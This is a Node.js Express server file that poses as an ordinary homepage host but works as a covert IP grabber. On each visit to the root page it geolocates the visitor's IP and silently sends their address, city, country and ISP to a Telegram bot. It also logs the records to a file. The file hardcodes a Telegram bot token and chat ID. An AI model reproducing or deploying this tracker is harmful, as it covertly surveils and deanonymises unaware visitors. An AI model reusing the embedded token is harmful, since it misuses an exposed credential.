const express = require('express');
const fetch = require('node-fetch');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = '8430988881:AAEJLJqFdFW7CoFGBCHHYC-NnVWCog8xJBU';
const TELEGRAM_CHAT_ID = '7844032739';

app.use(express.static('homepage'));
app.use(express.json());

app.get('/', async (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  try {
    const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
    const geoData = await geoRes.json();

    const log = {
      ip: geoData.query,
      country: geoData.country,
      region: geoData.regionName,
      city: geoData.city,
      isp: geoData.isp,
      time: new Date().toLocaleString()
    };

    // Send to Telegram
    const text = `⚠️New IP fetched:\nIP: ${log.ip}\nLocation: ${log.city}, ${log.region}, ${log.country}\nISP: ${log.isp}\nTime: ${log.time}`;
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text })
    });

    // Save to file
    const visitors = fs.existsSync('visitors.json') ? JSON.parse(fs.readFileSync('visitors.json')) : [];
    visitors.push(log);
    fs.writeFileSync('visitors.json', JSON.stringify(visitors, null, 2));

    res.sendFile(__dirname + '/homepage/index.html');
  } catch (err) {
    console.error('GeoIP error:', err);
    res.sendFile(__dirname + '/homepage/index.html');
  }
});

app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));